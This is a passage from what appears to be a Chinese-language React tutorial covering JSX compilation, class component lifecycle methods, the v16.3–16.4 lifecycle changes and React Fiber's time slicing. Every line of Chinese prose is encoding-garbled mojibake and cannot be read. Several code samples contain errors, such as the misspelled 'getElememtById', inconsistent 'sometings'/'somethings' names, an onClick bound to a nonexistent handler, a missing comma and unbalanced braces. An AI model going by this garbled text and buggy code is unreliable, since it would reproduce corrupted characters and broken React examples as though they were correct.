ä¸€è‡´ã€‚é€šè¿‡ ReactDOM.renderå°†å…ƒç´ æ¸²æŸ“åˆ° DOM èŠ‚ç‚¹ä¸Šã€‚ 12const App = &lt;div className="foo " /&gt;ReactDOM.render(&lt;App&gt;,document.getElementById('root')) åŽŸç† å¦‚ä½•ç”¨ JavaScript å…ƒç´ æ¥è¡¨ç¤ºä¸€ä¸ª DOM å…ƒç´ çš„ç»“æž„: 123456&lt;div class="box" id="content"&gt; &lt;div class="title"&gt; Hello &lt;/div&gt; &lt;button&gt;Click&lt;/button&gt;&lt;/div&gt; ä¸€ä¸ª DOM å…ƒç´ åŒ…å«çš„ä¿¡æ¯å…¶å®žåªæœ‰ä¸‰ä¸ªï¼šæ ‡ç­¾ã€å±žæ€§ï¼Œå­å…ƒç´ ï¼Œæ‰€ä»¥ä¸Šé¢çš„å†…å®¹å¯ä»¥è¡¨ç¤ºä¸º 12345678910111213&#123; tag:'div', attrs:&#123;className:'box',id:'content'&#125;, children:[&#123; tag:'div', attrs&#123;className:'title'&#125;, children:['Hello'] &#125;,&#123; tag:'button', attrs:null, children:['Click'] &#125;]&#125; ç”¨ javaScript æœ‰ä¸ªç¼ºç‚¹å°±æ˜¯å†…å®¹å¤ªé•¿ï¼Œç»“æž„ä¸å¤Ÿæ¸…æ™°ï¼Œç”¨ HTML çš„æ–¹å¼ä¼šæ–¹ä¾¿å¾ˆå¤šã€‚è€Œ React æŠŠ javascript æ‰©å±•äº†ä¸€ä¸‹ï¼Œè®© javascript èƒ½å¤Ÿæ”¯æŒç›´æŽ¥åœ¨ javascript ä»£ç ä¸­ç¼–å†™ç±»ä¼¼ HTML æ ‡ç­¾ç»“æž„çš„è¯­æ³•ã€‚ç¼–è¯‘çš„è¿‡ç¨‹ä¸­ä¼šæŠŠç±»ä¼¼ HTML çš„ JSX ç»“æž„è½¬æ¢æˆä¸º javascript çš„å¯¹è±¡ç»“æž„ã€‚ä¾‹å¦‚ä¸‹é¢çš„ä»£ç ï¼š 1234567891011121314151617import React,&#123;Component&#125; from 'react';import ReactDOM from 'react-dom';import '/index.css';class MyComponent extends Component&#123; render()&#123; return( &lt;div&gt; &lt;h1 className='title'&gt;React JSX&lt;/h1&gt; &lt;/div&gt; ) &#125;&#125;ReactDOM.render( &lt;MyComponent /&gt;, document.getElememtById('root')) ç»è¿‡ç¼–è¯‘åŽï¼š 1234567891011121314151617181920212223import React,&#123;Component&#125; from 'react';import ReactDOM from 'react-dom';import '/index.css';class MyComponent extends Component&#123; render()&#123; return( React.createElement( 'div', null, React.createElement( 'h1', &#123;className:'title'&#125;, "React JSX" ) ) ) &#125;&#125;ReactDOM.render( React.createElement(MyComponent,null) document.getElememtById('root')) React.createElement ä¼šæž„å»ºä¸€ä¸ª JavaScript å¯¹è±¡æ¥æè¿° HTML ç»“æž„çš„ä¿¡æ¯ï¼ŒåŒ…æ‹¬æ ‡ç­¾åï¼Œå±žæ€§ï¼Œè¿˜æœ‰å­å…ƒç´ ç­‰ç­‰ã€‚ æ‰€è°“çš„JSX å…¶å®žå°±æ˜¯ JavaScript å¯¹è±¡ React.renderåŠŸèƒ½å°±æ˜¯æŠŠç»„ä»¶æ¸²æŸ“å¹¶ä¸”æž„é€  DOM æ ‘ï¼Œç„¶åŽæ’å…¥åˆ°é¡µé¢ä¸Šç‰¹å®šçš„å…ƒç´ ä¸Šã€‚ æ€»ç»“è¿‡ç¨‹ï¼š 123 Babel ç¼–è¯‘ + React.js æž„é€  ReactDOM.renderJSX -----&gt; JavaScript å¯¹è±¡ç»“æž„ -----&gt; DOM å…ƒç´  -----&gt; æ’å…¥é¡µé¢ React ç”Ÿå‘½å‘¨æœŸå‡½æ•°React v16.0 å‰çš„ç”Ÿå‘½å‘¨æœŸåˆ†æˆå››ä¸ªé˜¶æ®µ Initializationã€Mountingã€Updationã€Unmounting Initializationsetup props and states 123456import React,&#123;Component&#125; from 'react';class Test extends Component&#123; constructor(props)&#123; super(props) &#125;&#125; Test ç±»ç»§æ‰¿ react çš„åŸºæœ¬ç±»ï¼Œæ‹¥æœ‰äº† render ï¼Œç”Ÿå‘½å‘¨æœŸç­‰ç­‰æ–¹æ³•å¯ä»¥ä½¿ç”¨ã€‚ super(props)ï¼Œç”¨æ¥è°ƒç”¨åŸºç±»çš„æž„é€ æ–¹æ³•ï¼ˆconstructor()ï¼‰ï¼Œå°†çˆ¶ç»„ä»¶ä¸­çš„props æ³¨å…¥ç»™å­ç»„ä»¶ï¼Œä¾›å…¶è¯»å–ã€‚ ä½¿ç”¨ES6 classesæž„å»ºç»„ä»¶çš„æ—¶å€™static defaultProps={}å…¶å®žå°±æ˜¯è°ƒç”¨å†…éƒ¨çš„getDefaultPropsæ–¹æ³•ã€‚ constructorå¯ä»¥åšä¸€äº›ç»„ä»¶åˆå§‹åŒ–çš„åŠŸèƒ½ï¼Œä¾‹å¦‚åˆå§‹åŒ– state,å°±æ˜¯è°ƒç”¨å†…éƒ¨çš„ getIntialStateæ–¹æ³• MountinggetDefaultProps =&gt; getInitialState =&gt; componentWillMount =&gt; render =&gt; componentDidMount componentWillMount åœ¨ç»„ä»¶æŒ‚è½½åˆ° DOM ä¹‹å‰è°ƒç”¨ä¸”åªä¼šè¢«è°ƒç”¨ä¸€æ¬¡ï¼Œè¿™é‡Œè°ƒç”¨ setStateä¸ä¼šå¼•èµ·ç»„ä»¶é‡æ–°æ¸²æŸ“ï¼Œä¹Ÿå¯ä»¥æŠŠè¿™è¾¹çš„å†…å®¹å†™åœ¨ constructorä¸­ã€‚å¦å¤– åœ¨ React SSR ä¸­ï¼Œè¿™ä¸ªç”Ÿå‘½å‘¨æœŸå‡½æ•°å¾ˆé‡è¦ã€‚React-Helmetç­‰ç­‰æ’ä»¶éƒ½æ˜¯æ ¹æ®è¿™ä¸ªå‡½æ•°æ¥å®žçŽ°åœ¨ Server æ’å…¥å†…å®¹ render æ ¹æ®ç»„ä»¶çš„ propså’Œ stateï¼Œè¿”å›žä¸€ä¸ª React å…ƒç´ ï¼Œä¸è´Ÿè´£ç»„ä»¶çš„å®žé™…æ¸²æŸ“å·¥ä½œï¼Œä¹‹åŽ React æ ¹æ®å…ƒç´ åŽ»æ¸²æŸ“ é¡µé¢çš„ DOM å·¥ä½œã€‚render æ˜¯çº¯å‡½æ•°ï¼Œä¸èƒ½åœ¨é‡Œé¢æ‰§è¡Œ this.setStateï¼Œä¼šæœ‰æ”¹å˜ç»„ä»¶çŠ¶æ€çš„å‰¯ä½œç”¨ componentDidMount ç»„ä»¶æŒ‚è½½åˆ° DOM åŽè°ƒç”¨ï¼Œä¸”åªä¼šè¢«è°ƒç”¨ä¸€æ¬¡ Updationprops: componentWillReciveProps =&gt; shouldComponentUpdate =&gt; ComponentWillUpdate =&gt; render =&gt; componentDidUpdate states: shouldComponentUpdate =&gt; componentWillUpdate =&gt; render =&gt; componentDidUpdate é€ æˆç»„ä»¶æ›´æ–°çš„æƒ…å†µæœ‰ä¸¤ç±»ï¼ˆä¸‰ç§ï¼‰æƒ…å†µ 1.çˆ¶ç»„ä»¶é‡æ–° render çˆ¶ç»„ä»¶é‡æ–° render å¼•èµ·å­ç»„ä»¶é‡æ–° render çš„æƒ…å†µæœ‰ä¸¤ç§ a) ç›´æŽ¥ä½¿ç”¨ï¼Œæ¯å½“çˆ¶ç»„ä»¶é‡æ–° render å¯¼è‡´ é‡ä¼  props,å­ç»„ä»¶å°†è·Ÿç€é‡æ–°æ¸²æŸ“ï¼Œæ— è®º props çŸ¥å¦æœ‰å˜åŒ–ï¼Œå¯é€šè¿‡ shouldComponentUpdateæ–¹æ³•ä¼˜åŒ– 12345678910class Child extends Component&#123; shouldComponentUpdate(nextProps)&#123; // ä½¿ç”¨è¿™ä¸ªæ–¹æ³•ï¼Œå¯ä»¥é¿å…æ— è®º props æ˜¯å¦æœ‰æ›´æ–°éƒ½ä¼šå¯¼è‡´ç»„ä»¶è·Ÿç€æ¸²æŸ“ if(nextProps.somethings === this.props.somethings)&#123; return false &#125; render()&#123; return &lt;div&gt;&#123;this.props.sometings&#125;&lt;/div&gt; &#125; &#125;&#125; b) åœ¨ componentWillReceivePropsæ–¹æ³•ä¸­ï¼Œå°† props æ¢æˆè‡ªå·±çš„ state 123456789101112131415class Child extends Component&#123; constructor(props)&#123; super(props); this.state = &#123; sometings:props.somethings &#125; &#125; componentWillReceiveProps(nextProps)&#123; // çˆ¶ç»„ä»¶é‡ä¼  props æ—¶ä¼šè°ƒç”¨è¿™ä¸ªæ–¹æ³• this.setState(&#123;something:nextProps.somethings&#125;) &#125; render()&#123; return &lt;div&gt;&#123;this.state.sometings&#125;&lt;/div&gt; &#125; &#125; å®˜ç½‘çš„æè¿°ï¼Œåœ¨ componentWillReceivePropsä¸­è°ƒç”¨ this.setState()ä¸ä¼šå¼•èµ·ç¬¬äºŒæ¬¡æ¸²æŸ“ æ˜¯å› ä¸º componentWillReceivePropsä¸­åˆ¤æ–­ propsæ˜¯å¦å˜åŒ–äº†ï¼Œå¦‚æžœå˜åŒ–äº†ï¼Œ this.setStateå°†å¼•èµ· stateçš„å˜åŒ–ï¼Œä»Žè€Œå¼•èµ· renderï¼Œæ­¤æ—¶å°±æ²¡æœ‰å¿…è¦å†åšç¬¬äºŒæ¬¡é‡ä¼  propså¼•èµ·çš„ render,é¿å…é‡å¤åšä¸€æ ·çš„æ¸²æŸ“ã€‚ 2.ç»„ä»¶æœ¬èº«è°ƒç”¨ setStateï¼Œæ— è®º state æ˜¯å¦æœ‰å˜åŒ–ï¼Œå¯é€šè¿‡ shouldComponentUpdateæ–¹æ³•ä¼˜åŒ– 123456789101112131415161718192021class Child extends Component&#123; constructor(props)&#123; super(props); this.state = &#123; something:1 &#125; &#125; shouldComponentUpdate(nextState)&#123; // ä½¿ç”¨è¿™ä¸ªæ–¹æ³•ï¼Œå¯ä»¥é¿å…ç›¸åŒ stateå¼•èµ· render if(nextState.something === this.state.something)&#123; return false &#125; &#125; handleClick = ()=&gt;&#123; const preSomething = this.state.something this.setState(&#123;something:preSomething&#125;) &#125; render()&#123; return &lt;div onClick=&#123;this.handleChild&#125;&gt;&#123;this.state.something&#125;&lt;/div&gt; &#125;&#125; componentWillReceviceProps(nextProps) è¿™ä¸ªæ–¹æ³•åªä¼šè°ƒç”¨äºŽprops å¼•èµ·çš„ç»„ä»¶æ›´æ–°è¿‡ç¨‹ä¸­ï¼Œå‚æ•° nextPropsæ˜¯çˆ¶ç»„ä»¶ä¼ ç»™å½“å‰ç»„ä»¶çš„æ–° propsã€‚ä½†æ˜¯çˆ¶ç»„ä»¶ renderæ–¹æ³•çš„è°ƒç”¨ä¸èƒ½ä¿è¯é‡ä¼ ç»™å½“å‰ç»„ä»¶çš„ props æ˜¯å¦æœ‰å˜åŒ–ï¼Œæ‰€ä»¥åœ¨æ­¤æ–¹æ³•æ ¹æ® nextPropså’Œ this.propsæ¥æŸ¥æ˜Žé‡ä¼ çš„ propsæ˜¯å¦æœ‰å˜åŒ–ï¼Œä»¥åŠå¦‚æžœæ”¹å˜äº†è¦æ‰§è¡Œä»€ä¹ˆï¼Œä¾‹å¦‚æ ¹æ®æ–°çš„ propsè°ƒç”¨ this.setState()è§¦å‘å½“å‰ç»„ä»¶é‡æ–° render shouldComponentUpdate(nextProps,nextState) é€šè¿‡æ¯”è¾ƒ nextPropsï¼ŒnextStateä»¥åŠ this.state,this.propsè¿”å›ž true æ—¶å½“å‰ç»„ä»¶å°†ç»§ç»­æ‰§è¡Œæ›´æ–°è¿‡ç¨‹ï¼Œè¿”å›ž false å½“å‰ç»„ä»¶åœæ­¢æ›´æ–°ï¼Œä»Žè€Œæ¥å‡å°‘ç»„ä»¶çš„ä¸å¿…è¦çš„æ¸²æŸ“ï¼Œä¼˜åŒ–ç»„ä»¶æ€§èƒ½ã€‚ componentWillUpdate(nextProps,nextState) åœ¨ è°ƒç”¨ render ä¹‹å‰è°ƒç”¨ï¼Œåœ¨è¿™é‡Œå¯ä»¥æ‰§è¡Œä¸€äº›ç»„ä»¶æ›´æ–°å‰çš„å·¥ä½œï¼Œä¸€èˆ¬æ¯”è¾ƒå°‘ç”¨ componentDidUpdate(prevProps,prevState) è¿™ä¸ªæ–¹æ³•ç»„ä»¶æ›´æ–°åŽè°ƒç”¨ï¼Œå¯ä»¥æ“ä½œç»„ä»¶æ›´æ–°çš„ DOM,prevPropsï¼ŒprevStateè¿™ä¸¤ä¸ªå‚æ•°æ˜¯æŒ‡ç»„ä»¶æ›´æ–°å‰çš„ props å’Œ state UnmountingcomponentWillUnMount componentWillUnMount è¿™ä¸ªæ–¹æ³•åœ¨ç»„ä»¶è¢«å¸è½½å‰è°ƒç”¨ï¼Œå¯ä»¥åœ¨è¿™é‡Œæ‰§è¡Œä¸€äº›æ¸…ç†å·¥ä½œã€‚ä¾‹å¦‚ç»„ä»¶ä¸­ä½¿ç”¨çš„å®šæ—¶å™¨ï¼ŒcomponentDidMount ä¸­æ‰‹åŠ¨åˆ›å»ºçš„ DOM å…ƒç´ ç­‰ç­‰ï¼Œå¯ä»¥é¿å…å†…å­˜æ³„éœ² å…·ä½“å®žçŽ°å¯ä»¥çœ‹çœ‹è¿™ç¯‡æ–‡ç« ï¼Œä¸€æ¬¡æ€§æžæ‡‚ React ç”Ÿå‘½å‘¨æœŸ React v.16.4 çš„ç”Ÿå‘½å‘¨æœŸå›¾ å˜æ›´ç¼˜æ•…ç”Ÿå‘½å‘¨æœŸåœ¨React v16 æŽ¨å‡º Fiber åŽå°±ä¸åˆé€‚äº†ï¼Œå¦‚æžœå¼€å¯ async renderingï¼Œåœ¨ renderå‡½æ•°ä¹‹å‰çš„æ‰€æœ‰å‡½æ•°ï¼Œéƒ½æœ‰å¯èƒ½è¢«æ‰§è¡Œå¤šæ¬¡ã€‚ v.16 å‰çš„ç”Ÿå‘½å‘¨æœŸä¸­,componentWillMount,componentReceiveProps, shouldComponentUpdate,componentWillUpdateæ˜¯åœ¨ renderä¹‹å‰æ‰§è¡Œçš„ã€‚ å¼€å‘è€…å¦‚æžœå¼€å¯äº† async renderingï¼Œè€Œä¸”åœ¨ä¸Šè¿°çš„ç”Ÿå‘½å‘¨æœŸæ–¹æ³•åš ajax è¯·æ±‚çš„è¯ï¼Œé‚£å°±å°†ä¼šè¢«æ— è°“å¤šæ¬¡è°ƒç”¨ã€‚æ˜Žæ˜¾ä¸æ˜¯æˆ‘ä»¬æœŸæœ›çš„ç»“æžœã€‚åœ¨ componentWillMountè¯·æ±‚ ajax ,ä¸ç®¡å¤šå¿«çš„ç»“æžœéƒ½è·Ÿä¸ä¸Šé¦–æ¬¡ renderï¼Œè€Œä¸” componentWillMountåœ¨æœåŠ¡å™¨æ¸²æŸ“ä¹Ÿä¼šè¢«è°ƒç”¨åˆ°ï¼Œè¿™æ ·çš„ IO æ“ä½œæ”¾åœ¨ componentDidMounté‡Œé¢æ›´åŠ é€‚åˆã€‚ ç¦æ­¢ä¸èƒ½ç”¨æ¯”åŠå¯¼å¼€å‘è€…ä¸è¦è¿™æ ·ç”¨æ›´å¥½ï¼Œæ‰€ä»¥é™¤äº† shouldComponentUpdateï¼Œå…¶ä»–åœ¨ renderå‡½æ•°ä¹‹å‰çš„æ‰€æœ‰å‡½æ•° componentWillMountã€componentWillReceivePropsï¼ŒcomponentWillUpdateéƒ½è¢« getDerivedStateFromPropsæ›¿ä»£ã€‚ å°±æ˜¯ç”¨ä¸€ä¸ªé™æ€å‡½æ•° getDerivedStateFromPropsæ¥å–ä»£è¢« deprecateçš„å‡ ä¸ªç”Ÿå‘½å‘¨æœŸå‡½æ•°ï¼Œå¼ºåˆ¶å¼€å‘è€…åœ¨ renderä¹‹å‰åªåšæ— å‰¯ä½œç”¨çš„æ“ä½œï¼Œè€Œä¸”èƒ½åšçš„æ“ä½œå±€é™åœ¨æ ¹æ® propså’Œ stateå†³å®šæ–°çš„ state å®˜ç½‘API-getDerivedStateFromProps() å…³äºŽæ›´å¤š v16.0 åˆšæŽ¨å‡ºçš„æ—¶å€™ï¼Œå¢žåŠ äº†ä¸€ä¸ª componentDidCatch ç”Ÿå‘½å‘¨æœŸå‡½æ•°ï¼Œæ–°å¼•å…¥çš„ä¸¤ä¸ªç”Ÿå‘½å‘¨æœŸå‡½æ•°:getDerivedStateFromPropså’Œ getSnapshotBeforeUpdate getDerivedStateFromProps getDerivedStateFromPropsåœ¨v.16.3 ä¸­åªæ˜¯åˆ›å»ºå’Œæ›´æ–°ï¼ˆç”±çˆ¶ç»„ä»¶å¼•å‘çš„ï¼‰ã€‚å¦‚æžœä¸ç”±çˆ¶ç»„ä»¶å¼•å‘ï¼Œè¿™ä¸ªæ–¹æ³•æ˜¯ä¸ä¼šè°ƒç”¨çš„ï¼Œå¦‚è‡ªèº«çš„ setState å’Œ forceUpateå¼•å‘çš„ã€‚ åœ¨ v.16.4 ä¸­æ”¹æ­£äº†è¿™ä¸€ç‚¹ï¼Œè®© getDerivedStateFromProps æ— è®ºæ˜¯ Mounting è¿˜æ˜¯ Updating,ä¹Ÿæ— è®ºæ˜¯å› ä¸ºä»€ä¹ˆå¼•èµ·çš„ Updatingå…¨éƒ¨éƒ½ä¼šè¢«è°ƒç”¨ã€‚ static getDerivedStateFromProps(props,state)åœ¨ç»„ä»¶åˆ›å»ºæ—¶å’Œæ›´æ–°æ—¶çš„ renderæ–¹æ³•ä¹‹å‰è°ƒç”¨ï¼Œå®ƒåº”è¯¥è¿”å›žä¸€ä¸ªå¯¹è±¡æ¥æ›´æ–°çŠ¶æ€ï¼Œæˆ–è€…è¿”å›ž null æ¥ä¸æ›´æ–°ä»»ä½•å†…å®¹ getSnapshotBeforeUpadate getSnapshotBeforeUpdateè¢«è°ƒç”¨äºŽ render ä¹‹åŽï¼Œå¯ä»¥è¯»å–ä½†æ˜¯æ— æ³•ä½¿ç”¨ DOM çš„æ—¶å€™ã€‚å®ƒä½¿å¾—ç»„ä»¶å¯ä»¥åœ¨å¯èƒ½æ›´æ”¹ä¹‹å‰ä»Ž DOM ä¸­æ•èŽ·ä¸€äº›ä¿¡æ¯ï¼ˆä¾‹å¦‚æ»šåŠ¨ä½ç½®ï¼‰ã€‚è¿™ä¸ªç”Ÿå‘½å‘¨æœŸè¿”å›žçš„ä»»ä½•å€¼éƒ½å°†ä½œä¸ºå‚æ•°ä¼ é€’ç»™ componentDidUpdate å®˜ç½‘çš„ä¾‹å­ï¼š 1234567891011121314151617181920212223242526class ScrollingList extends React.Component&#123; constructor(props)&#123; super(props); this.listRef = React.createRef(); &#125; getSnapshotBeforeUpdate(nextProps,prevState)&#123; // æˆ‘ä»¬æ˜¯å¦è¦æ·»åŠ æ–°çš„ items åˆ°åˆ—è¡¨ä¸­ï¼Œæ•èŽ·æ»šåŠ¨ä½ç½®ä»¥ä¾¿æˆ‘ä»¬å¯ä»¥ç¨åŽæ•´ç†æ»šåŠ¨ if(prevProps.list.length &lt; this.props.list.length)&#123; const list = this.listRef.current; return list.scrollHeight - list.scrollTop &#125; return null; &#125; componentDidUpdate(prevProps,prevState,snapshot)&#123; // å¦‚æžœæˆ‘ä»¬æœ‰ snapshot å€¼ï¼Œæˆ‘ä»¬å·²ç»æ·»åŠ æ–°çš„ itemsï¼Œè°ƒæ•´æ»šåŠ¨ä»¥è‡³äºŽè¿™äº›æ–°çš„ itemsï¼Œä¸ä¼šå°†å°±çš„ items æŽ¨å‡ºè§†å›¾ã€‚ if(snapshot)&#123; const list = this.listRef.current; list.scrollTop = list.scrollHeight - snapshot; &#125; &#125; render()&#123; return( &lt;div ref=&#123;this.listRef&#125;&gt;&#123;/* ...contents */&#125;&lt;/div&gt; ) &#125;&#125; å¦å¤–å¯ä»¥çœ‹çœ‹è¿™ç¯‡æ–‡ç« ï¼Œä½ å¯èƒ½ä¸éœ€è¦æ´¾ç”ŸçŠ¶æ€ React Fiberå®˜æ–¹çš„è§£é‡Š: React Fiber æ˜¯å¯¹æ ¸å¿ƒç®—æ³•çš„ä¸€æ¬¡é‡æ–°å®žçŽ° åŒæ­¥æ›´æ–°è¿‡ç¨‹çš„å±€é™v16 ä¹‹å‰ï¼Œæ›´æ–°è¿‡ç¨‹æ˜¯åŒæ­¥çš„ï¼Œè¿™å¯èƒ½ä¼šå¯¼è‡´æ€§èƒ½é—®é¢˜ã€‚ React å†³å®šè¦åŠ è½½æˆ–è€…æ›´æ–°ç»„ä»¶æ ‘çš„æ—¶å€™ï¼Œä¼šåšå¾ˆå¤šäº‹æƒ…ï¼Œæ¯”å¦‚è°ƒç”¨å„ä¸ªç»„ä»¶çš„ç”Ÿå‘½å‘¨æœŸå‡½æ•°ï¼Œè®¡ç®—å’Œå¯¹æ¯” Virtual DOM ,æœ€åŽæ›´æ–° DOM æ ‘ï¼Œè¿™æ•´ä¸ªè¿‡ç¨‹æ˜¯åŒæ­¥è¿›è¡Œçš„ï¼Œä¹Ÿå°±æ˜¯è¯´åªè¦ä¸€ä¸ªåŠ è½½æˆ–è€…æ›´æ–°è¿‡ç¨‹å¼€å§‹ï¼Œé‚£ä¹ˆ React å°±ä¼šä¸€ç›´æ›´æ–°ä¸‹åŽ»ï¼Œä¸­é€”ä¸ä¼šåœæ­‡ã€‚ è¡¨é¢çœ‹ï¼Œè¿™æ ·çš„è®¾è®¡ä¹Ÿæ˜¯åˆç†çš„ï¼Œæ›´æ–°è¿‡ç¨‹ä¸­ä¸ä¼šæœ‰ I/O æ“ä½œï¼Œå®Œå…¨æ˜¯ CPU è®¡ç®—ï¼Œæ‰€ä»¥ä¸éœ€å¼‚æ­¥æ“ä½œã€‚ä½†æ˜¯å½“ç»„ä»¶ä¹¦æ¯”è¾ƒåºžå¤§çš„æ—¶å€™ï¼Œé—®é¢˜å°±æ¥äº†ã€‚ ä¾‹å¦‚æ›´æ–°ä¸€ä¸ªç»„ä»¶éœ€è¦1æ¯«ç§’ï¼Œå¦‚æžœæœ‰200ä¸ªç»„ä»¶éœ€è¦æ›´æ–°ï¼Œé‚£å°±æœ‰200æ¯«ç§’ã€‚ç”¨æˆ·åœ¨ input æŒ‰é’®è¾“å…¥ä¸€ä¸ªå­ï¼Œè¦ç­‰å¾…200æ¯«ç§’æ‰ä¼šæœ‰ååº”ï¼Œé€ æˆç•Œé¢å¡é¡¿ï¼Œå¸¦æ¥ä¸å¥½çš„ç”¨æˆ·ä½“éªŒã€‚ å¦å¤–ä¸€ä¸ªç”ŸåŠ¨çš„æ¯”è¾ƒå°±æ˜¯æ½œæ°´å‘˜çš„æ¯”å–»ï¼Œæ½œæ°´å‘˜è¿›è¡Œæ½œæ°´ä»»åŠ¡ï¼Œåœ¨æ½œåˆ°åº•çš„è¿‡ç¨‹ä¸­ï¼Œå¦‚æžœå²¸ä¸Šæœ‰æ›´åŠ ä¼˜å…ˆçš„ä»»åŠ¡ä»–æ˜¯ä¸çŸ¥é“çš„ï¼Œåªæœ‰å½“ä»–é‡æ–°æµ®å‡ºæ°´é¢æ‰èƒ½åŽ»æ‰§è¡Œä¼˜å…ˆçº§æ›´é«˜çš„ä»»åŠ¡ã€‚ å› ä¸º javascript å•çº¿ç¨‹çš„ç‰¹ç‚¹ï¼Œæ¯ä¸ªåŒæ­¥ä»»åŠ¡çš„è€—æ—¶ä¸èƒ½å¤ªé•¿ï¼Œä¸ç„¶å°±ä¼šè®©ç¨‹åºä¸ä¼šå¯¹å…¶ä»–è¾“å…¥åšå‡ºååº”ï¼ŒReact çš„æ›´æ–°å°±æ˜¯çŠ¯äº†è¿™ä¸ªç¦æ­¢ï¼Œè€Œ React Fiber æ˜¯è¦æ”¹å˜çŽ°çŠ¶ã€‚ React Fiberåˆ†ç‰‡æ˜¯ç ´è§£ Javascript åŒæ­¥æ“ä½œæ—¶é—´è¿‡é•¿çš„æ–¹æ³•ã€‚ æŠŠä¸€ä¸ªè€—æ—¶é•¿çš„ä»»åŠ¡åˆ†æˆå¾ˆå¤šå°ç‰‡ï¼Œæ¯ä¸€ä¸ªå°ç‰‡çš„è¿è¡Œæ—¶é—´éƒ½å¾ˆçŸ­ï¼Œè™½ç„¶æ€»æ—¶é—´ä¾ç„¶å¾ˆé•¿ï¼Œä½†æ˜¯åœ¨æ¯ä¸ªå°ç‰‡æ‰§è¡Œä¹‹åŽï¼Œéƒ½ç»™å…¶ä»–ä»»åŠ¡ä¸€ä¸ªæ‰§è¡Œçš„æœºä¼šï¼Œè¿™æ ·å”¯ä¸€çš„çº¿ç¨‹å°±ä¸ä¼šè¢«ç‹¬å ï¼Œå…¶ä»–ä»»åŠ¡ä¾ç„¶æœ‰è¿è¡Œçš„æ—¶é—´ã€‚ React Fiber æŠŠæ›´æ–°è¿‡ç¨‹ç¢Žç‰‡åŒ–ï¼Œæ¯æ‰§è¡Œä¸€æ®µæ›´æ–°è¿‡ç¨‹ï¼Œå°±æŠŠæŽ§åˆ¶æƒäº¤è¿˜ç»™ React è´Ÿè´£ä»»åŠ¡åè°ƒçš„æ¨¡å—ï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰å…¶ä»–ç´§æ€¥ä»»åŠ¡è¦åšï¼Œå¦‚æžœæ²¡æœ‰å°±ç»§ç»­åŽ»æ›´æ–°ï¼Œå¦‚æžœæœ‰ç´§æ€¥ä»»åŠ¡ï¼Œé‚£å°±åŽ»åšç´§æ€¥ä»»åŠ¡ã€‚ ç»´æŠ¤æ¯ä¸€ä¸ªåˆ†ç‰‡çš„æ•°æ®ç»“æž„ï¼Œå°±æ˜¯ Fiber ä¸ºä»€ä¹ˆå« Fiberåœ¨è®¡ç®—æœºç§‘å­¦ä¸­ï¼ŒFiber çš„å«ä¹‰æ˜¯ â€œçº¤ç»´â€ï¼Œæ„æŒ‡æ¯” Thread(çº¿ç¨‹) æ›´ç»†çš„çº¿ï¼Œä¹Ÿå°±æ˜¯æ¯”çº¿ç¨‹æŽ§åˆ¶æ›´ç²¾å¯†çš„å¹¶å‘å¤„ç†æœºåˆ¶ã€‚ React Fiber å¯¹çŽ°æœ‰ä»£ç çš„å½±å“åœ¨ React Fiber ä¸­ï¼Œä¸€æ¬¡æ›´æ–°è¿‡ç¨‹ä¼šåˆ†æˆå¤šä¸ªåˆ†ç‰‡å®Œæˆï¼Œæ‰€ä»¥å®Œå…¨å¯èƒ½ä¸€ä¸ªæ›´æ–°ä»»åŠ¡è¿˜æ²¡æœ‰å®Œæˆï¼Œä¼šè¢«å¦ä¸€ä¸ªæ›´é«˜ä¼˜å…ˆçº§çš„æ›´æ–°è¿‡ç¨‹æ‰“æ–­ï¼Œè¿™æ—¶å€™ï¼Œä¼˜å…ˆçº§çš„æ›´æ–°ä»»åŠ¡ä¼šä¼˜å…ˆå¤„ç†å®Œï¼Œè€Œä½Žä¼˜å…ˆçº§æ›´æ–°ä»»åŠ¡æ‰€åšçš„å·¥ä½œåˆ™ä¼šå®Œå…¨ä½œåºŸï¼Œç„¶åŽç­‰å¾…æœºä¼šé‡å¤´å†æ¥ã€‚ å› ä¸ºä¸€ä¸ªæ›´æ–°è¿‡ç¨‹å¯èƒ½ä¼šè¢«æ‰“æ–­ï¼Œæ‰€ä»¥ React Fiber æ›´æ–°è¿‡ç¨‹ä¼šè¢«åˆ†æˆä¸¤ä¸ªé˜¶æ®µï¼ˆPhaseï¼‰ï¼šç¬¬ä¸€ä¸ªé˜¶æ®µ Reconciliation å’Œ ç¬¬äºŒä¸ªé˜¶æ®µ Commit Phase. åœ¨ç¬¬ä¸€ä¸ªé˜¶æ®µä¸­ï¼ŒReact Fiber ä¼šæ‰¾å‡ºéœ€è¦æ›´æ–°å“ªäº› DOM,è¿™ä¸ªé˜¶æ®µå¯ä»¥è¢«æ‰“æ–­ï¼Œä½†æ˜¯åˆ°äº†ç¬¬äºŒä¸ªé˜¶æ®µï¼Œé‚£å°±æ˜¯ä¸€é¼“ä½œæ°”æŠŠ DOM æ›´æ–°å®Œæˆï¼Œä¸ä¼šè¢«æ‰“æ–­ã€‚ è¿™ä¸¤ä¸ªé˜¶æ®µå¤§éƒ¨åˆ†å·¥ä½œæ˜¯ç»“åˆ React Fiber å’Œ ç”Ÿå‘½å‘¨æœŸå‡½æ•°ã€‚ ä»¥ render ä¸ºç•Œï¼Œç¬¬ä¸€ä¸ªé˜¶æ®µå¯èƒ½ä¼šè°ƒç”¨ä¸‹é¢è¿™äº›ç”Ÿå‘½å‘¨æœŸå‡½æ•°ï¼š componentWillMount componentWillReceiveProps shouldComponentUpdate componentWillUpdate ä¸‹é¢è¿™äº›ç”Ÿå‘½å‘¨æœŸå‡½æ•°åˆ™ä¼šåœ¨ç¬¬äºŒä¸ªé˜¶æ®µè°ƒç”¨ componentDidMount componentDidUpdate componentWillUnmount å› ä¸ºç¬¬ä¸€ä¸ªé˜¶æ®µä¼šè¢«æ‰“æ–­ï¼Œé‡æ–°å†æ¥ï¼Œä¼šé€ æˆæ„æƒ³ä¸åˆ°çš„æƒ…å†µã€‚ æ¯”å¦‚è¯´ï¼Œä¸€ä¸ªä½Žä¼˜å…ˆçº§çš„ä»»åŠ¡ A æ­£åœ¨æ‰§è¡Œï¼Œå·²ç»è°ƒç”¨äº†æŸä¸ªç»„ä»¶çš„ componentWillUpdateå‡½æ•°ï¼ŒæŽ¥ä¸‹æ¥å‘çŽ°è‡ªå·±çš„æ—¶é—´åˆ†ç‰‡å·²ç»ç”¨å®Œäº†ï¼ŒäºŽæ˜¯å†’å‡ºæ°´é¢ï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰ç´§æ€¥ä»»åŠ¡ï¼Œå‘çŽ°æœ‰ä¸ªç´§æ€¥ä»»åŠ¡Bï¼ŒæŽ¥ä¸‹æ¥ React Fiber 